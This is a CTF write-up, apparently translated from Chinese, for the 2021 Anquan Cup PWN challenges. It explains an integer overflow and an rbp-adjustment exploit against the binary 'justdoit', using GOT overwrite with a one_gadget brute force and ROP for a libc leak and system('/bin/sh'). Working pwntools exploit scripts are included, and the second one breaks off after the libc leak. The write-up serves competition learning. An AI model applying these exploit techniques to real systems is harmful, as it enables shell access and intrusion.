# 2021暗泉杯（东软杯）PWN/RE WP
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
这是第一届2021暗泉杯（东软杯）的pwn和re题解，这次比赛pwn看似不难，但是还是缺少思路，其中两道题目都是相似的逻辑，应该是一个出题人出的题目，当时没想到爆破，呜呜呜呜
## PWN -> NSS_shop
这个是签到题目，据官方说是个整数溢出，随便输点大数造成整数溢出就可以拿到flag
    ---------------    0.Flag: 10000$
    1.Hint: 0$
    ---------------    > 0
    Number of items >
    123123123
    flag{Pwn_Is_Vary_Ez}
## PWN -> justdoit （调整rbp）
###  题目分析
题目没开pie，没开canary，查看环境2.23，打开ida查看伪代码，很简单，但是没有溢出：
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char buf[32]; // [rsp+0h] [rbp-20h] BYREF
      init();
      printf("Hi there! What is your name? ");
      read(0, buf, 24uLL);
      puts("That is an interesting chall");
      printf("where are you from? my frends??");
      read_long();
      return 0;
    }
    __int64 read_long()
    {
      char buf[32]; // [rsp+0h] [rbp-20h] BYREF
      read(0, buf, 19uLL);
      return atol(buf);
    }
程序很简单，有两次输入，都没溢出，仔细看看汇编代码发现可以随意修改rbp的位置：
    .text:0000000000401239                 call    read_long
    .text:000000000040123E                 add     rbp, rax        
    .text:0000000000401241                 mov     eax, 0
    .text:0000000000401246                 leave
    .text:0000000000401247                 retn
所以这里就可以通过调整rbp控制程序的返回地址，但重要的是怎么利用？当时想着rop，但是这长度远远不够最小的rop长度（当时想的是至少4段，但是只有三段rop空间，少一个ret的空间，后来弄明白可以利用rbp调整来让程序返回到main，三段刚刚好够用），比赛也没做出来，后面才知道爆破是个可行方法.泄露libc也是一个方法。
###  利用思路
**利用方式1：爆破onegadget**
第一次输入可以输入3个地址长度，这里分别为read_long、第一个read地址、start地址，然后通过第二次read_long可以修改rbp到第一次输入buf的上方，程序下次返回就能返回到构造的地址read_long处，然后输入[PI:EMAIL](mailto:PI:EMAIL)的地址，atol后会设置rax为[PI:EMAIL](mailto:PI:EMAIL)，read_long返回会返回到第一个read地址处，接着read，但是注意此时的buf已被修改为[PI:EMAIL](mailto:PI:EMAIL)，因为read的第二个参数在rsi中，而在之前read_long函数执行完后rax被设置成[PI:EMAIL](mailto:PI:EMAIL)，当跳转到read的时候buf是由rax赋值的，所以在执行的时候就会往[PI:EMAIL](mailto:PI:EMAIL)处写，这就可以覆盖[PI:EMAIL](mailto:PI:EMAIL)的后3个字节为ongadget去拿shell。
    .text:00000000004011FF                 mov     edx, 18h        ; nbytes
    .text:0000000000401204                 mov     rsi, rax        ; buf
    .text:0000000000401207                 mov     edi, 0          ; fd
    .text:000000000040120C                 call    _read
    .text:0000000000401211                 lea     rax, s          ; "That is an interesting chall"
这里经过调试发现当后面调用printf触发onegadget的时候rax=0，所以第一个onegadget可以用，这里我们只能确切修改地址末12bit位，经过比较onegadget和[PI:EMAIL](mailto:PI:EMAIL)相差3个字节24位，所以剩下的12位就只能爆破了。  
利用步骤：
  1. 输入返回地址read_long、第一个read地址
  2. read_long调整rbp返回到read_long,接着输入[PI:EMAIL](mailto:PI:EMAIL)，rax=[PI:EMAIL](mailto:PI:EMAIL)
  3. 返回到第一个read地址，此时read的buf = [PI:EMAIL](mailto:PI:EMAIL)，修改末12位为onegadget偏移，剩余12为爆破
  4. 后面printf触发onegadget。
爆破长度12位，16 _16_ 8=2048次，实际上爆破长度是16^3
**利用方式二：泄露libc，rop**
和上面方式一样，首先将输入三个main地址入栈（用于rop结束后返回到main），之后调整rbp返回到main函数，此时会在原栈帧上方（低地址）重新开辟栈空间，输入rop调用put函数将put地址泄露出来拿到libc，之后会再次返回到main，接着rop调用system(‘/bin/sh’),获取shell。  
步骤：
  1. 第一个read输入三个main地址用于返回，read_long调整rbp返回到main
  2. 接着rop返回到put，泄露put地址，拿到libc
  3. 接着rop返回到system，获取shell。
这种方式明显优于爆破方式，利用调整rbp来返回到rop，进而泄露libc，获取shell。
###  exp1 爆破onegadget
    # -*- coding: utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    context.terminal = ["/usr/bin/tmux","sp","-h"]
    #io = remote('127.0.0.1', 6010)
    # libc = ELF('./libc-2.31.so')
    # io = process(['./test', 'real'])
    #io = process('./justdoit.1')
    #libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
    l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
    l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
    rl = lambda    a=False        : io.recvline(a)
    ru = lambda a,b=True    : io.recvuntil(a,b)
    rn = lambda x            : io.recvn(x)
    sn = lambda x            : io.send(x)
    sl = lambda x            : io.sendline(x)
    sa = lambda a,b            : io.sendafter(a,b)
    sla = lambda a,b        : io.sendlineafter(a,b)
    irt = lambda            : io.interactive()
    dbg = lambda text=None  : gdb.attach(io, text)
    lg = lambda s            : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
    uu32 = lambda data        : u32(data.ljust(4, b'\x00'))
    uu64 = lambda data        : u64(data.ljust(8, b'\x00'))
    ur64 = lambda data        : u64(data.rjust(8, b'\x00'))
    main=0x4011D5
    pop_rdi=0x00000000004012b3
    pop_rbp=0x000000000040114d
    lea_ret=0x00000000004011d3
    payload=p64(0x4011A9)+p64(0x4011FF)
    #payload=p64(read_lpng)+p64(read)
    def pwn():
        sn(payload)
        ru('where are you from? my frends??')
        sn(str(-0x28))
        sn(str(0x000000000404020))
        sn('\x26\x82\x3b')
        sleep(0.1)
        sl('ls')
        sl('ls')
        ru('flag')
        sl('cat flag')
        irt()
    while True:
        try:
            #io=remote('47.106.172.144',65004)
            io=process('./justdoit.1')
            pwn()
        except:
            io.close()
            continue
###  exp2 泄露libc，rop
    # -*- coding: utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    context.terminal = ["/usr/bin/tmux","sp","-h"]
    io = remote('47.106.172.144', 65004)
    # libc = ELF('./libc-2.31.so')
    # io = process(['./test', 'real'])
    # io = process('./justdoit.1')
    libc=ELF('./libc.so.6')
    elf=ELF('./justdoit.1')
    l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
    l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
    rl = lambda    a=False        : io.recvline(a)
    ru = lambda a,b=True    : io.recvuntil(a,b)
    rn = lambda x            : io.recvn(x)
    sn = lambda x            : io.send(x)
    sl = lambda x            : io.sendline(x)
    sa = lambda a,b            : io.sendafter(a,b)
    sla = lambda a,b        : io.sendlineafter(a,b)
    irt = lambda            : io.interactive()
    dbg = lambda text=None  : gdb.attach(io, text)
    lg = lambda s            : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
    uu32 = lambda data        : u32(data.ljust(4, b'\x00'))
    uu64 = lambda data        : u64(data.ljust(8, b'\x00'))
    ur64 = lambda data        : u64(data.rjust(8, b'\x00'))
    main=0x4011D5
    pop_rdi=0x00000000004012b3
    pop_rbp=0x000000000040114d
    lea_ret=0x00000000004011d3
    ru("name?")
    sn(p64(main)+ p64(main) + p64(main))
    ru("s??")
    sl(b"-24")
    ru("name?")
    sn(p64(pop_rdi) + p64(elf.got["puts"]) + p64(elf.plt["puts"]))
    ru("s??")
    sl(b"-40")
    libc.address = l64() - libc.sym["puts"]
    print(hex(libc.address))
    ru("name?")